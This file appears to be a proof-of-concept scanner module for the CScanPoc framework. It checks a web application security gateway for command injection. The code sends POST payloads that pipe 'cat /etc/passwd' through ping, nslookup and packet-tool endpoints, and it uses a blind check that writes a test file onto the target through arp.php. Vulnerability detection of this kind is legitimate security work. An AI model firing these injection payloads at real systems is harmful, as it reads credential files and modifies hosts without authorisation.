# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import random

class Vuln(ABVuln):
    vuln_id = 'yuanwei_0004' # 平台漏洞编号，留空
    name = '远为应用安全网关命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        远为应用安全网关多处命令执行。
        /tools/fault/sys_ping.php
        /tools/fault/sys_nslookup.php
        /tools/fault/sys_webpacket.php
        tools/fault/arp.php
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '应用安全网关'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'bd70f5ef-421a-47e8-8082-2ca4acf6cedc'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            arg = self.target
            content_type = 'Content-Type: application/x-www-form-urlencoded'
            urls = [
                arg + '/tools/fault/sys_ping.php',
                arg + '/tools/fault/sys_nslookup.php',
                arg + '/tools/fault/sys_webpacket.php'
            ]
            posts = [
                'name=a|cat%20%2Fetc%2Fpasswd*wtf*4',
                'name=a|cat%20/etc/passwd',
                'name=a|cat%20/etc/passwd',
            ]
            for i in range(len(urls)):
                url = urls[i]
                post = posts[i]
                code, head, res, err, _ = hh.http(url, post, header=content_type)
                if(code == 200) and ('root:' in res):
                    #security_hole('Command execution: ' + url + 'POST: ' +post)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))


            #无回显
            url  = arg + '/tools/fault/arp.php'
            post = 'str=a|echo%20testvul>test.txt'
            code, head, res, err, _ = hh.http(url, post=post)
            if (code == 200):
                code, head, res, err, _ = hh.http(arg + '/tools/fault/test.txt')
                if(code == 200) and ('testvul' in res):
                    #security_hole('Command execution: ' + url + 'POST: ' +post)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
